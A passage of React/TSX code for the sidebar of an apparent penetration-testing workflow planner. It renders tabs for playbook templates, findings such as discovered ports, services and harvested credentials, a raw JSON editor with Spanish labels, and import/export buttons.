                <label className="py-1.5 px-2 bg-black/40 hover:bg-white/5 border border-white/10 text-slate-350 text-[10px] font-mono rounded flex items-center justify-center space-x-1.5 transition cursor-pointer text-center">
                  <Upload className="h-3 w-3" />
                  <span>Plan.json</span>
                  <input
                    type="file"
                    accept=".json"
                    onChange={handleImportBasePlanJson}
                    className="hidden"
                  />
                </label>
              </div>

              {customRules.length > 0 && (
                <div className="mt-2 space-y-1.5 pt-2 border-t border-purple-500/20">
                  <div className="flex justify-between items-center">
                    <span className="text-[9px] font-mono text-purple-400 uppercase">Custom Rules ({customRules.length})</span>
                    <button
                      onClick={() => {
                        onUpdateCustomRules([]);
                        onLogMessage('info', 'Active base plan rules wiped successfully.');
                      }}
                      className="text-[8px] font-mono text-pink-400 hover:text-pink-300 transition flex items-center gap-0.5 cursor-pointer"
                    >
                      Clear
                    </button>
                  </div>
                  <div className="max-h-24 overflow-y-auto space-y-1 pr-1">
                    {customRules.map((rule) => (
                      <div key={rule.id} className="bg-black/30 border border-purple-500/10 rounded p-1.5 text-[8px] font-sans">
                        <div className="font-bold text-slate-200">{rule.name}</div>
                        <div className="text-slate-400 italic">↳ Suggests tool: {rule.suggestNode.tool}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Tactical Playbooks library */}
            <div className="p-3 bg-white/[0.01] border border-white/5 rounded space-y-3">
              <span className="text-[10px] font-mono text-slate-400 uppercase tracking-widest block font-bold">Built-In Playbooks</span>
              <div className="space-y-1.5">
                {WORKFLOW_TEMPLATES.map((tpl, idx) => (
                  <button
                    key={idx}
                    onClick={() => handleLoadTemplate(tpl)}
                    className="w-full p-2 bg-black/40 hover:bg-[#10B981]/10 hover:border-[#10B981]/30 rounded border border-white/5 text-left transition flex flex-col cursor-pointer"
                  >
                    <span className="text-[11px] font-sans font-bold text-slate-100">{tpl.name}</span>
                    <span className="text-[9px] text-[#10B981] font-mono">{tpl.category}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ======================= FINDINGS TAB ======================= */}
        {activeSidebarTab === 'findings' && (
          <div className="p-4 space-y-4">
            <div className="space-y-1">
              <h3 className="text-xs font-mono text-amber-400 uppercase tracking-wider font-bold">Active Findings Cabinet</h3>
              <p className="text-[10px] text-slate-400 font-sans leading-relaxed">
                Summary of all active discoveries and technical intelligence accumulated by marking steps as succeeded.
              </p>
            </div>

            {/* Aggregated Ports visual ledger */}
            <div className="space-y-1.5 bg-[#0A0B0E] p-3 rounded border border-white/5">
              <label className="text-[9px] font-mono text-slate-500 uppercase font-bold tracking-wide">Target Ports Identified</label>
              {allPorts.length === 0 ? (
                <p className="text-[10px] font-mono text-slate-600 italic">No ports discovered. Mark a scanning node as completed with evidence.</p>
              ) : (
                <div className="flex flex-wrap gap-1 pt-1">
                  {allPorts.map(p => {
                    const isWeb = p === 80 || p === 443 || p === 8080 || p === 8443;
                    return (
                      <span
                        key={p}
                        className={`text-[9.5px] font-mono px-2 py-0.5 rounded font-semibold ${
                          isWeb 
                            ? 'bg-[#10B981]/15 text-emerald-400 border border-[#10B981]/30' 
                            : 'bg-white/10 text-slate-300 border border-white/5'
                        }`}
                      >
                        {p}
                      </span>
                    )
                  })}
                </div>
              )}
            </div>

            {/* Services ledger summary */}
            <div className="space-y-1.5 bg-[#0A0B0E] p-3 rounded border border-white/5">
              <label className="text-[9px] font-mono text-slate-500 uppercase font-bold tracking-wide">Target Services Discovered</label>
              {allServices.length === 0 ? (
                <p className="text-[10px] font-mono text-slate-600 italic font-sans">No services registered.</p>
              ) : (
                <div className="flex flex-wrap gap-1 pt-1">
                  {allServices.map(s => (
                    <span key={s} className="text-[9.5px] font-mono bg-white/5 text-slate-300 border border-white/5 px-2 py-0.5 rounded uppercase">
                      {s}
                    </span>
                  ))}
                </div>
              )}
            </div>

            {/* Credentials harvested table */}
            <div className="space-y-1.5 bg-[#0A0B0E] p-3 rounded border border-white/5">
              <label className="text-[9.5px] font-mono text-slate-500 uppercase tracking-wide flex items-center gap-1 font-bold">
                <KeyRound className="h-3 w-3 text-amber-500" /> Harvested Credentials ({allCreds.length})
              </label>
              {allCreds.length === 0 ? (
                <p className="text-[10px] font-mono text-slate-600 italic pr-1 leading-relaxed">No credential hashes harvested yet. Populate credentials in nodes' Structured Evidence.</p>
              ) : (
                <div className="bg-black/35 border border-white/5 rounded p-2 text-[10px] font-mono mt-1 divide-y divide-[#1e2230] max-h-56 overflow-y-auto">
                  {allCreds.map((cred, idx) => (
                    <div key={idx} className="flex justify-between items-center py-1.5 flex-wrap gap-1">
                      <span className="text-slate-100 font-bold">{cred.username}</span>
                      <span className="text-pink-400 font-semibold truncate max-w-28" title={cred.password}>{cred.password || 'no-pass'}</span>
                      <span className="text-slate-500 text-[8.5px]">({cred.sourceNode})</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ======================= DIRECT RAW JSON TAB ======================= */}
        {activeSidebarTab === 'json' && (
          <div className="p-4 flex flex-col h-full space-y-4">
            <div className="space-y-1">
              <h3 className="text-xs font-mono text-purple-400 uppercase tracking-widest font-black">RAW JSON SCHEMA DECK</h3>
              <p className="text-[10px] text-slate-400 font-sans leading-relaxed">
                Modifica directamente el diagrama de red, las fases de ataque, enlaces y variables globales en tiempo real.
              </p>
            </div>

            {/* Error detection live visualization box */}
            {jsonError ? (
              <div id="json-editor-error-box" className="p-2.5 bg-rose-950/40 border border-rose-500/25 rounded text-[10px] font-mono text-rose-350 leading-relaxed max-w-full break-all">
                <span className="font-bold uppercase text-[9px] text-[#F43F5E] block mb-0.5">⚠️ ERROR DE VALIDACIÓN:</span>
                {jsonError}
              </div>
            ) : (
              <div id="json-editor-success-box" className="p-2.5 bg-emerald-950/20 border border-emerald-500/15 rounded text-[10px] font-sans text-emerald-400 flex items-center gap-1.5 select-none">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse shrink-0" />
                <span>Estructura JSON correcta. Todo listo para actualizar.</span>
              </div>
            )}

            <div className="relative flex flex-col min-h-0 bg-black/40 border border-white/5 rounded overflow-hidden">
              <div className="text-[9px] font-mono bg-black/40 p-1.5 border-b border-white/5 text-slate-500 flex justify-between items-center select-none">
                <span>blueprint_schema.json</span>
                <span className="text-[8px] opacity-60">Schema Active</span>
              </div>
              <textarea
                id="raw-json-textarea"
                value={jsonText}
                onChange={(e) => {
                  setJsonText(e.target.value);
                  // Dynamic background syntax checker
                  try {
                    const parsed = JSON.parse(e.target.value);
                    if (parsed && typeof parsed === 'object') {
                      setJsonError(null);
                    }
                  } catch (err: any) {
                    setJsonError(`Error de sintaxis: ${err.message}`);
                  }
                }}
                className="w-full h-96 bg-[#06070a] text-slate-300 font-mono text-[10.5px] p-2.5 focus:outline-none focus:ring-1 focus:ring-purple-500/30 overflow-auto resize-none leading-relaxed"
                placeholder='{ "nodes": [], "connections": [] }'
                spellCheck={false}
              />
            </div>

            <button
              id="raw-json-update-button"
              onClick={handleUpdateFromJson}
              className="w-full py-2 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 border border-purple-500/30 rounded text-xs font-mono font-bold text-white shadow-lg transition duration-200 cursor-pointer text-center uppercase tracking-wider flex items-center justify-center space-x-1.5"
            >
              <Terminal className="h-3.5 w-3.5" />
              <span>Actualizar Diagrama</span>
            </button>
          </div>
        )}
      </div>

      {/* Export / Import Persistent controls Footer */}
      <div className="p-4 space-y-2 border-t border-white/10 bg-[#0F1116] shrink-0">
        <div className="grid grid-cols-2 gap-2">
          {/* Export click */}
          <button
            id="btn-sidebar-export-json"
            onClick={handleExportJson}
            className="py-2 px-3 bg-[#0c0d12] hover:bg-white/5 border border-white/10 rounded text-[11px] font-mono font-semibold text-slate-350 transition flex items-center justify-center space-x-1.5 cursor-pointer"
            title="Download playbooks as JSON"
          >
            <Download className="h-3.5 w-3.5" />
            <span>Export Flow</span>
          </button>

          {/* Import picker */}
          <label className="py-2 px-3 bg-[#0c0d12] hover:bg-white/5 border border-white/10 rounded text-[11px] font-mono font-semibold text-slate-350 transition flex items-center justify-center space-x-1.5 cursor-pointer text-center">
            <Upload className="h-3.5 w-3.5" />
            <span>Import JSON</span>
            <input
              type="file"
              accept=".json"
              onChange={handleImportJson}
              className="hidden"
            />
          </label>
        </div>
      </div>

    </div>
  );
}
